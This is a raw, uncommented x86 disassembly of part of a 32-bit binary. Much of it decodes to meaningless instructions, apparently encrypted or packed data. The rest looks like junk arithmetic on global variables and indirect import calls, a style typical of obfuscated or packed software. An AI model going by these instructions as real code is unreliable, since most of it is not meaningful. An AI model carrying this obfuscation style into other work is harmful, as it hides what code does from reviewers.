  41829a:	jns    0x418319
  41829c:	jnp    0x4182ed
  41829e:	cmp    DWORD PTR [edi-0x59],0xcc09d930
  4182a5:	sbb    al,0x33
  4182a7:	int3   
  4182a8:	adc    al,0xed
  4182aa:	popa   
  4182ab:	dec    esi
  4182ac:	mov    ch,0xd9
  4182ae:	push   cs
  4182af:	test   DWORD PTR [ebx+0x38],edi
  4182b2:	stos   DWORD PTR es:[edi],eax
  4182b3:	fs mov ebx,0xfc6c0bad
  4182b9:	lock std 
  4182bb:	nop
  4182bc:	mov    ch,0x92
  4182be:	inc    ebx
  4182bf:	push   DWORD PTR [esi]
  4182c1:	mov    ds:0xed5be601,eax
  4182c6:	jmp    eax
  4182c8:	ins    DWORD PTR es:[edi],dx
  4182c9:	fistp  QWORD PTR [esi]
  4182cb:	sti    
  4182cc:	pop    ebp
  4182cd:	jno    0x418306
  4182cf:	mov    ds:0x1b9642ae,eax
  4182d4:	xchg   edx,eax
  4182d5:	inc    eax
  4182d6:	inc    ebp
  4182d7:	jmp    0xa0dd88c6
  4182dc:	mov    bh,0x5
  4182de:	mov    al,0x8f
  4182e0:	retf   
  4182e1:	sub    cl,bl
  4182e3:	idiv   BYTE PTR [ebp+0x5cea6ccd]
  4182e9:	mov    eax,ds:0x7739856b
  4182ee:	add    cl,BYTE PTR [esi+0x12dfced1]
  4182f4:	jns    0x41833d
  4182f6:	push   edi
  4182f7:	cmp    al,0xe5
  4182f9:	cmp    al,0x5b
  4182fb:	mov    al,ds:0x669f7833
  418300:	pushf  
  418301:	inc    esi
  418302:	xlat   BYTE PTR ds:[ebx]
  418303:	stc    
  418304:	push   ebp
  418305:	dec    ecx
  418306:	mov    edx,0xca189331
  41830b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41830c:	stc    
  41830d:	pop    DWORD PTR [ebp-0x5d528b6d]
  418313:	cld    
  418314:	(bad)  
  418315:	and    ebp,DWORD PTR [esi+0x8]
  418318:	dec    eax
  418319:	cmc    
  41831a:	mov    edi,0x54bb85d7
  41831f:	inc    edi
  418320:	mov    ecx,0x41f0b222
  418325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418326:	xchg   bl,ch
  418328:	aaa    
  418329:	pop    ss
  41832a:	nop
  41832b:	aam    0x43
  41832d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41832f:	popa   
  418330:	in     eax,dx
  418331:	mov    ecx,0x7b1ae843
  418336:	arpl   WORD PTR ds:0xedf043e1,bx
  41833c:	xchg   ebx,eax
  41833d:	daa    
  41833e:	push   ds
  41833f:	push   ebp
  418340:	adc    dl,0xef
  418343:	adc    BYTE PTR [esi],ah
  418345:	clc    
  418346:	loopne 0x418364
  418348:	mov    ecx,0xffcab79e
  41834d:	xor    BYTE PTR [ebx-0x7ccbdbbc],cl
  418353:	cmp    eax,0x4281d7
  418358:	add    bh,al
  41835a:	add    eax,0x42829b
  41835f:	mov    BYTE PTR [edx+0x0],0x0
  418363:	mov    DWORD PTR ds:0x4283d7,edx
  418369:	mov    DWORD PTR ds:0x4281b3,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x4282d7,0x243f
  418382:	mov    DWORD PTR ds:0x4282af,0x6875
  41838c:	cmp    DWORD PTR ds:0x4281d7,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x428373
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428edc
  4183ae:	add    DWORD PTR ds:0x42833f,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x4282c3
  4183ba:	xor    DWORD PTR ds:0x428377,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x428353
  4183c6:	or     DWORD PTR ds:0x4281cf,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x42827b,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x42827f,0x4281eb
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x4281df,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x4283df
  418409:	or     DWORD PTR ds:0x4283d7,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x4281af,0x428377
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x42827b,0x0
  418430:	mov    DWORD PTR ds:0x42828b,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x4283d3,0x5a59
  41844e:	cmp    DWORD PTR ds:0x42827b,0x0
  418455:	jl     0x41847f
  41845b:	push   0x4280d3
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428e38
  41846b:	sbb    DWORD PTR ds:0x4282bf,0x4c8f
  418475:	mov    DWORD PTR ds:0x4281b7,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x4283d3
  418485:	xor    ecx,DWORD PTR ds:0x42833b
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x4283d7,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x42834f,0x4282bb
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x4283f7,0x42827f
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x42834b,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	mov    esi,eax
  4184f9:	cmp    edi,DWORD PTR [esi+0x1816d1f6]
  4184ff:	mov    esp,0xb8181812
  418504:	jp     0x4184aa
  418506:	imul   BYTE PTR [esp+ecx*4+0x61877bfc]
  41850d:	pop    ecx
  41850e:	out    dx,al
  41850f:	xor    BYTE PTR [edx-0xf],al
  418512:	jge    0x418526
  418514:	fcmovnb st,st(7)
  418516:	sbb    esp,DWORD PTR [eax]
  418518:	pop    ebx
  418519:	mov    bh,ch
  41851b:	mov    ah,0x8f
  41851d:	pusha  
  41851e:	fild   DWORD PTR [esi+edx*1-0x2dd6bfbf]
  418525:	int    0x3f
  418527:	ins    BYTE PTR es:[edi],dx
  418528:	daa    
  418529:	dec    esp
  41852a:	xor    al,0x68
  41852c:	push   esi
  41852d:	and    DWORD PTR [edx],0x23be1ab0
  418533:	mov    eax,ds:0x20998808
  418538:	mov    eax,0xd8cb00d4
  41853d:	fcmovu st,st(2)
  41853f:	xchg   edx,eax
  418540:	popf   
  418541:	shl    BYTE PTR [edi-0x2fbb5fba],cl
  418547:	mov    dh,0x7d
  418549:	pop    es
  41854a:	mov    DWORD PTR [edi],esi
  41854c:	int    0xe0
  41854e:	mov    ah,0x1
  418550:	outs   dx,BYTE PTR ds:[esi]
  418551:	icebp  
  418552:	repz and al,0xfe
  418555:	sub    eax,0x28159bc4
  41855a:	pushf  
  41855b:	jge    0x418517
  41855d:	out    dx,al
  41855e:	call   0xa509:0xc3e7dda5
  418565:	mov    esp,0xe3967632
  41856a:	inc    ebp
  41856b:	dec    edi
  41856c:	lock and esi,ebp
  41856f:	fs clc 
  418571:	sbb    BYTE PTR [eax+0x200902ac],dl
  418577:	iret   
  418578:	mov    ebp,0x78e57b2b
  41857d:	sub    DWORD PTR [edi],ebp
  41857f:	xlat   BYTE PTR ds:[ebx]
  418580:	mov    cl,0x48
  418583:	sub    DWORD PTR [ebx+0x23],esi
  418586:	xchg   ebx,eax
  418587:	(bad)  
  418588:	in     al,dx
  418589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41858a:	(bad)  
  41858b:	jmp    0x831ef9e1
  418590:	fiadd  DWORD PTR [ebp-0x13d83c7]
  418596:	(bad)  
  418597:	mov    ah,cl
  418599:	int3   
  41859a:	adc    eax,0x5fcd2784
  41859f:	pusha  
  4185a0:	or     ch,bl
  4185a2:	or     DWORD PTR [esi-0x6a],esp
  4185a5:	int3   
  4185a6:	outs   dx,DWORD PTR ds:[esi]
  4185a7:	and    cl,ah
  4185a9:	adc    BYTE PTR [edi],0x5a
  4185ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185ad:	shr    DWORD PTR [edi+edi*4+0x54d974cc],0x3d
  4185b5:	sbb    al,BYTE PTR [ecx+0x5]
  4185b8:	sub    ecx,DWORD PTR [ebp-0x68]
  4185bb:	es push esp
  4185bd:	in     al,dx
  4185be:	outs   dx,BYTE PTR ds:[esi]
  4185bf:	jne    0x418638
  4185c1:	add    DWORD PTR [edi-0x15],edx
  4185c4:	mov    BYTE PTR [ebx-0x48feba27],0xbd
  4185cb:	shl    ebx,1
  4185cd:	retf   0xa81b
  4185d0:	fwait
  4185d1:	mov    ds:0x7255d51,eax
  4185d6:	push   ds
  4185d7:	xor    DWORD PTR [edi+0x209b19e2],0x3c
  4185de:	inc    edx
  4185df:	push   ss
  4185e0:	loope  0x418577
  4185e2:	pop    ebx
  4185e3:	xchg   ebp,eax
  4185e4:	or     bh,0xc
  4185e7:	inc    eax
  4185e8:	repz data16 test al,0xc5
  4185ec:	lods   al,BYTE PTR ds:[esi]
  4185ed:	sub    DWORD PTR [eax],ebp
  4185ef:	mov    eax,DWORD PTR [bx+si]
  4185f2:	in     al,0x5d
  4185f4:	call   0x1175bc5
  4185f9:	cmp    eax,0xe1c378c2
  4185fe:	outs   dx,BYTE PTR ds:[esi]
  4185ff:	jno    0x4185b7
  418601:	mov    ah,dl
  418603:	pop    edi
  418604:	nop
  418605:	xor    BYTE PTR [ebp+ebp*8-0x2b],ch
  418609:	ret    
  41860a:	inc    eax
  41860b:	add    al,0x3b
  41860d:	sbb    BYTE PTR [esi-0x544c5f6f],ah
  418613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418614:	sub    DWORD PTR [ecx*1+0x5e7bff68],eax
  41861b:	add    bl,dh
  41861d:	push   ebx
  41861e:	push   0x58415497
  418623:	push   cs
  418624:	push   0xb1a9c16
  418629:	mov    edi,0xf34b00c0
  41862e:	and    ah,cl
  418630:	iret   
  418631:	outs   dx,DWORD PTR ds:[esi]
  418632:	gs in  al,dx
  418634:	int3   
  418635:	les    esi,FWORD PTR [esi+0x66]
  418638:	mul    DWORD PTR ds:0xb46d46a2
  41863e:	mov    bl,cl
  418640:	hlt    
  418641:	pop    esp
  418642:	or     ebx,DWORD PTR [ebp-0x59]
  418645:	shr    DWORD PTR [ebx],1
  418647:	mov    dl,0x7e
  418649:	push   ss
  41864a:	xchg   ecx,eax
  41864b:	cmp    DWORD PTR [edi],edx
  41864d:	(bad)  
  41864e:	fbld   TBYTE PTR [edx]
  418650:	test   DWORD PTR [eax-0x74],ecx
  418653:	(bad)  
  418654:	popf   
  418655:	sub    dl,ch
  418657:	or     eax,0x367912ac
  41865c:	pop    ds
  41865d:	cmp    esi,esp
  41865f:	pop    ds
  418660:	push   ecx
  418661:	bswap  edx
  418663:	mov    cl,0x58
  418665:	adc    al,0xcc
  418667:	(bad)  
  418668:	adc    eax,0xcd7f6f4
  41866d:	jns    0x4186d5
  41866f:	cmp    esp,edi
  418671:	mov    dh,0x2e
  418673:	xlat   BYTE PTR ds:[ebx]
  418674:	retf   0x6302
  418677:	xor    BYTE PTR [eax+0x50],cl
  41867a:	test   al,0x79
  41867c:	jp     0x41866a
  41867e:	bswap  esp
  418680:	or     al,0x82
  418682:	and    DWORD PTR [ecx],esp
  418684:	inc    eax
  418685:	xchg   ecx,eax
  418686:	mov    DWORD PTR [ecx+0x49],ebx
  418689:	test   BYTE PTR [edx-0x3b],cl
  41868c:	cli    
  41868d:	ret    
  41868e:	add    dh,ch
  418690:	cmp    dh,BYTE PTR [ebx+0x45]
  418693:	pop    esp
  418694:	pushw  0xbe15
  418698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418699:	test   al,0x66
  41869b:	pop    esi
  41869c:	or     ah,dl
  41869e:	mul    DWORD PTR [ebx]
  4186a0:	mov    esi,0xd74f7976
  4186a5:	aas    
  4186a6:	xchg   ecx,eax
  4186a7:	jge    0x4186c1
  4186a9:	(bad)  
  4186aa:	pop    ebp
  4186ab:	scas   al,BYTE PTR es:[edi]
  4186ac:	ds add edx,ebx
  4186af:	cmp    ah,BYTE PTR [ebp+0x24df1fc7]
  4186b5:	mov    ds:0x4ec3c98c,al
  4186ba:	pop    eax
  4186bb:	mov    bh,dl
  4186bd:	push   esi
  4186be:	jmp    0x41866a
  4186c0:	ret    0x52b2
  4186c3:	pop    ds
  4186c4:	rcr    DWORD PTR [edx],cl
  4186c6:	add    eax,0x42d8c76b
  4186cb:	jmp    0xc3f2ce2e
  4186d0:	dec    ebp
  4186d1:	mov    al,0x28
  4186d3:	lahf   
  4186d4:	fdiv   QWORD PTR [edx-0x7e]
  4186d7:	inc    ebx
  4186d8:	ja     0x4186ac
  4186da:	dec    esp
  4186db:	inc    esi
  4186dc:	in     eax,dx
  4186dd:	loope  0x41870e
  4186df:	(bad)  
  4186e0:	not    BYTE PTR [esi]
  4186e2:	jmp    0xe0c13979
  4186e7:	xor    BYTE PTR [ebp+0x1c],al
  4186ea:	pop    ebx
  4186eb:	neg    BYTE PTR [edi+0xb]
  4186ee:	push   ebx
  4186ef:	and    BYTE PTR [esi+0x1e],ah
  4186f2:	and    al,0xff
  4186f4:	pop    ebx
  4186f5:	aas    
  4186f6:	cmp    dh,BYTE PTR [edx+0x610f3abf]
  4186fc:	or     eax,0x9a81aab6
  418701:	xchg   BYTE PTR [ebx],cl
  418703:	mov    esp,0xa92d424
  418708:	jne    0x4186a5
  41870a:	jl     0x418700
  41870c:	aad    0xcd
  41870e:	daa    
  41870f:	xchg   ebp,eax
  418710:	jecxz  0x418730
  418712:	sbb    BYTE PTR [ebp-0x21],cl
  418715:	sbb    BYTE PTR [edx],al
  418717:	rol    BYTE PTR [edi-0x7d],0xe0
  41871b:	retf   
  41871c:	sbb    bl,BYTE PTR [eax+0x7f9a085d]
  418722:	sub    dh,dh
  418724:	adc    eax,0x451a99ea
  418729:	sahf   
  41872a:	jnp    0x41870d
  41872c:	ret    
  41872d:	mov    eax,ds:0xd86b2dce
  418732:	sar    BYTE PTR [esi],1
  418734:	dec    ecx
  418735:	ror    BYTE PTR [ecx],1
  418737:	fnstsw WORD PTR [eax-0x7892a441]
  41873d:	mov    dl,0xbf
  41873f:	leave  
  418740:	and    eax,0x407c5f1c
  418745:	test   BYTE PTR [edi+0x74205f77],al
  41874b:	add    al,0xb6
  41874d:	in     al,0x82
  41874f:	leave  
  418750:	xchg   ebx,eax
  418751:	or     al,0xae
  418753:	out    dx,al
  418754:	cmp    edi,DWORD PTR [ebx-0x3cfefa06]
  41875a:	aaa    
  41875b:	out    0xda,eax
  41875d:	push   ebp
  41875e:	ror    BYTE PTR [ebp+0x69c2ce0e],0xf
  418765:	pop    esp
  418766:	or     ebp,ebp
  418768:	test   BYTE PTR [eax+0x1f],cl
  41876b:	push   esp
  41876c:	xchg   ebx,eax
  41876d:	cmp    al,0x6f
  41876f:	mov    BYTE PTR ds:0x593f1a70,dl
  418775:	lods   eax,DWORD PTR ds:[esi]
  418776:	fisubr DWORD PTR [edx-0x5e114172]
  41877c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41877e:	mov    edi,0xea6317a0
  418783:	outs   dx,DWORD PTR ds:[esi]
  418784:	test   eax,0xf5333a4a
  418789:	aas    
  41878a:	loope  0x41875c
  41878c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41878d:	add    al,0xf8
  41878f:	mov    ah,0x30
  418791:	add    ecx,esp
  418793:	clc    
  418794:	lods   eax,DWORD PTR ds:[esi]
  418795:	scas   eax,DWORD PTR es:[edi]
  418796:	scas   al,BYTE PTR es:[edi]
  418797:	ins    BYTE PTR es:[edi],dx
  418798:	xor    DWORD PTR [ecx+0x7],0x38
  41879c:	pop    ds
  41879d:	mov    ch,0x1d
  41879f:	inc    edi
  4187a0:	arpl   dx,ax
  4187a2:	add    eax,ebp
  4187a4:	sub    DWORD PTR [ebp+0x763a1e9e],ebp
  4187aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187ab:	sbb    eax,0xbb9cafbc
  4187b0:	fs fs ins BYTE PTR es:[edi],dx
  4187b3:	repz sub al,0x79
  4187b6:	inc    eax
  4187b7:	pop    edi
  4187b8:	arpl   WORD PTR ss:[esi-0x22c21452],dx
  4187bf:	push   esp
  4187c0:	and    esi,ecx
  4187c2:	stos   BYTE PTR es:[edi],al
  4187c3:	add    DWORD PTR [edi-0x685111ce],esi
  4187c9:	and    DWORD PTR [esi-0x7d],ebp
  4187cc:	mov    ch,0x85
  4187ce:	jle    0x418782
  4187d0:	jg     0x418826
  4187d2:	int    0xee
  4187d4:	add    al,BYTE PTR [ebp+0x60dcdc79]
  4187da:	jmp    0x4187fd
  4187dc:	sub    ebx,DWORD PTR ds:0x8c47be86
  4187e2:	fcomp  QWORD PTR [edx-0x5a5237a6]
  4187e8:	adc    BYTE PTR [ebx*2-0x289991ff],ch
  4187ef:	and    esp,DWORD PTR [esi+0xa]
  4187f2:	dec    eax
  4187f3:	fwait
  4187f4:	xor    al,0x56
  4187f6:	(bad)  
  4187f7:	ja     0x4187b7
  4187f9:	mov    edi,0xa41b4ba1
  4187fe:	in     eax,0xbb
  418800:	pop    eax
  418801:	xchg   edi,eax
  418802:	inc    ebp
  418803:	enter  0xf839,0xfd
  418807:	mov    ah,BYTE PTR [edi]
  418809:	ficomp DWORD PTR [eax]
  41880b:	stos   BYTE PTR es:[edi],al
  41880c:	dec    esp
  41880d:	cwde   
  41880e:	scas   eax,DWORD PTR es:[edi]
  41880f:	into   
  418810:	pop    eax
  418811:	retf   
  418812:	inc    edx
  418813:	outs   dx,DWORD PTR ds:[esi]
  418814:	ret    0xbca9
  418817:	lods   eax,DWORD PTR ds:[esi]
  418818:	dec    esp
  418819:	fwait
  41881a:	push   cs
  41881b:	jmp    0x1f90ad85
  418820:	adc    eax,0xb882d6fa
  418825:	ss aad 0x6e
  418828:	ja     0x418833
  41882a:	inc    ecx
  41882b:	sbb    ebp,DWORD PTR [edi]
  41882d:	push   0xffffff9c
  41882f:	push   esi
  418830:	jl     0x418883
  418832:	clc    
  418833:	(bad)  [ebp+eiz*8+0x60860433]
  41883a:	rol    DWORD PTR [ebp-0x28],cl
  41883d:	in     eax,0x95
  41883f:	jb     0x4188be
  418841:	cdq    
  418842:	mov    eax,eax
  418844:	mov    WORD PTR [eax],fs
  418846:	inc    esp
  418847:	pop    ds
  418848:	and    ah,BYTE PTR [ebx+ecx*1]
  41884b:	xor    BYTE PTR [edi+esi*2-0x4c],0x0
  418850:	lods   al,BYTE PTR ds:[esi]
  418851:	pusha  
  418852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418853:	xchg   BYTE PTR [ebx],ah
  418855:	in     eax,0x44
  418857:	adc    DWORD PTR [esi-0x4fa0f45b],ecx
  41885d:	xchg   esi,edi
  41885f:	pop    edx
  418860:	mov    bh,0x8c
  418862:	xor    BYTE PTR [esi-0x53],ah
  418865:	clc    
  418866:	cmp    al,0x31
  418868:	mov    ch,0xcc
  41886a:	repnz (bad) 
  41886c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41886d:	jmp    0x391c733c
  418872:	aas    
  418873:	mov    ecx,0x4715cbc8
  418878:	outs   dx,BYTE PTR ds:[esi]
  418879:	xor    DWORD PTR [esi-0x7f],esi
  41887c:	pop    ebp
  41887d:	sub    DWORD PTR ds:0x1cfbcab1,0x76
  418884:	and    DWORD PTR [edi],ebx
  418886:	or     ch,bl
  418888:	cmp    al,0xd8
  41888a:	ins    DWORD PTR es:[edi],dx
  41888b:	scas   al,BYTE PTR es:[edi]
  41888c:	pusha  
  41888d:	push   DWORD PTR [ebx-0x4ff657fe]
  418893:	ins    BYTE PTR es:[edi],dx
  418894:	test   eax,0x6400ac0
  418899:	sub    BYTE PTR [eax-0x80],al
  41889c:	dec    DWORD PTR [esi]
  41889e:	enter  0x892c,0x51
  4188a2:	(bad)  
  4188a3:	imul   ebx,DWORD PTR [edi],0x3f896a00
  4188a9:	push   ebx
  4188aa:	lahf   
  4188ab:	in     eax,0x2c
  4188ad:	xchg   edx,eax
  4188ae:	sub    BYTE PTR [ebp+0x66],0x2b
  4188b2:	cmp    cl,cl
  4188b4:	loope  0x418841
  4188b6:	dec    esp
  4188b7:	and    al,0x48
  4188b9:	or     DWORD PTR ds:0x42828b,0x42827b
  4188c3:	xor    eax,ecx
  4188c5:	adc    ecx,DWORD PTR ds:0x4281a3
  4188cb:	mov    ecx,DWORD PTR [esp+0x28]
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x428293,0x4282eb
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x4281df,0x4282e3
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x42828f,0x4283cf
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x4282cb,0x7154
  418909:	call   DWORD PTR ds:0x428df8
  41890f:	or     DWORD PTR ds:0x4282e3,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x4283e7,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x42836f,0x0
  418935:	mov    DWORD PTR ds:0x42834f,ebx
  41893b:	mov    DWORD PTR ds:0x4282d3,ebx
  418941:	mov    esi,DWORD PTR ds:0x4282a3
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x42836f,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428e3c
  41896e:	movzx  esi,WORD PTR ds:0x428373
  418975:	sbb    DWORD PTR ds:0x4281b3,esi
  41897b:	adc    DWORD PTR ds:0x4283bf,0x5f0e
  418985:	xor    DWORD PTR ds:0x4283f7,ebx
  41898b:	mov    esi,DWORD PTR ds:0x428287
  418991:	xor    esi,DWORD PTR ds:0x4281c3
  418997:	mov    DWORD PTR ds:0x428287,esi
  41899d:	add    DWORD PTR ds:0x428297,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x4283f3,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x4283cb,0x42828b
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x4281b3,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x42836b,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x4282f3
  4189ec:	mov    edx,DWORD PTR ds:0x42827b
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x4283f3,0x606f
  418a03:	mov    DWORD PTR ds:0x4281cf,ebx
  418a09:	cmp    DWORD PTR ds:0x42836b,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428e40
  418a1c:	adc    DWORD PTR ds:0x4281ab,ebx
  418a22:	or     DWORD PTR ds:0x4282af,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x42825f
  418a34:	mov    edx,DWORD PTR ds:0x428383
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x428373
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x4282f7,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x4283f3,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x4282cb,0x11c5
  418a73:	mov    DWORD PTR ds:0x4283e7,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x4281ab
  418a85:	mov    eax,ds:0x4282eb
  418a8a:	cmp    DWORD PTR ds:0x4283f3,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428ee0
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x4283c3,0x4bc8
  418aba:	sub    DWORD PTR ds:0x4282d3,edi
  418ac0:	or     DWORD PTR ds:0x4282cb,0x2abb
  418aca:	sbb    DWORD PTR ds:0x4283bf,ebx
  418ad0:	mov    eax,ds:0x4225a8
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x4281cb,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0xe9b0b184
  418af3:	rcr    DWORD PTR [ebp+0x70],0x9a
  418af7:	retf   
  418af8:	push   ss
  418af9:	sbb    BYTE PTR [edx+edx*1-0x4281e7e8],bh
  418b00:	sbb    eax,0x268eda2e
  418b05:	push   edx
  418b06:	add    DWORD PTR [edx],edx
  418b08:	add    dl,bh
  418b0a:	mov    DWORD PTR [esi],eax
  418b0c:	mov    bl,0x5
  418b0e:	dec    ecx
  418b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b10:	pushf  
  418b11:	and    esp,DWORD PTR [eax]
  418b13:	ja     0x418b39
  418b15:	push   ds
  418b16:	test   eax,0x1bc1c76f
  418b1b:	shl    ecx,0x60
  418b1e:	jmp    0x18b205f7
  418b23:	dec    eax
  418b24:	xlat   BYTE PTR ds:[ebx]
  418b25:	push   0xffffffeb
  418b27:	jbe    0x418b8b
  418b29:	int    0x9
  418b2b:	adc    edi,edx
  418b2d:	das    
  418b2e:	jb     0x418af6
  418b30:	mov    dl,0xdd
  418b32:	xchg   edx,eax
  418b33:	lock aam 0x38
  418b36:	add    eax,0x1a0fdaba
  418b3b:	ret    0x5626
  418b3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b3f:	scas   eax,DWORD PTR es:[edi]
  418b40:	clc    
  418b41:	inc    ebp
  418b42:	or     BYTE PTR [eax+0x98a7c99],bh
  418b48:	ret    
  418b49:	dec    ebp
  418b4a:	jbe    0x418b62
  418b4c:	adc    DWORD PTR [edx+0x12],0xffffffd8
  418b50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b51:	sub    eax,0xc7815810
  418b56:	jne    0x418b94
  418b58:	sbb    edi,DWORD PTR [ebx-0x2fa405b0]
  418b5e:	lods   eax,DWORD PTR ds:[esi]
  418b5f:	mov    bh,0x6c
  418b61:	or     cl,dl
  418b63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b64:	les    edx,FWORD PTR [ecx-0x16]
  418b67:	dec    edi
  418b68:	pushf  
  418b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b6a:	loope  0x418b8b
  418b6c:	and    eax,0xb085c5fc
  418b71:	imul   eax,DWORD PTR ds:0xee064a29,0x2d6232ec
  418b7b:	and    eax,0x34bc3c92
  418b80:	jae    0x418bfb
  418b82:	cmp    BYTE PTR [edx-0x41],ch
  418b85:	adc    edi,DWORD PTR [ecx-0x2c]
  418b88:	and    ebp,edi
  418b8a:	adc    DWORD PTR [edx-0x15fed53b],edx
  418b90:	call   0x8bfd:0x4fce70e1
  418b97:	rsm    
  418b99:	mov    bl,BYTE PTR [ebx-0x7c3a28e4]
  418b9f:	lds    eax,FWORD PTR [edx+0x2]
  418ba2:	aas    
  418ba3:	inc    ecx
  418ba4:	push   ebp
  418ba5:	jp     0x418b39
  418ba7:	dec    ebp
  418ba8:	sub    ah,dl
  418baa:	dec    ecx
  418bab:	and    BYTE PTR [edi-0x64e8c289],cl
  418bb1:	pop    edx
  418bb2:	mov    DWORD PTR [ecx],ecx
  418bb4:	inc    esp
  418bb5:	fs pop edi
  418bb7:	imul   edx,DWORD PTR [ebx],0x3f
  418bba:	repnz outs dx,BYTE PTR ds:[esi]
  418bbc:	aam    0x42
  418bbe:	and    BYTE PTR [edi+0x1e],bl
  418bc1:	sbb    DWORD PTR [ebx],0xffffffd8
  418bc4:	mov    dh,0xc
  418bc6:	mov    bl,0xb3
  418bc8:	arpl   sp,si
  418bca:	in     al,0x50
  418bcc:	test   DWORD PTR [ecx-0xd04f523],edi
  418bd2:	or     al,BYTE PTR [edx+0x19f6a594]
  418bd8:	sub    al,0xce
  418bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bdb:	leave  
  418bdc:	jo     0x418bbb
  418bde:	mov    ds:0x45425298,eax
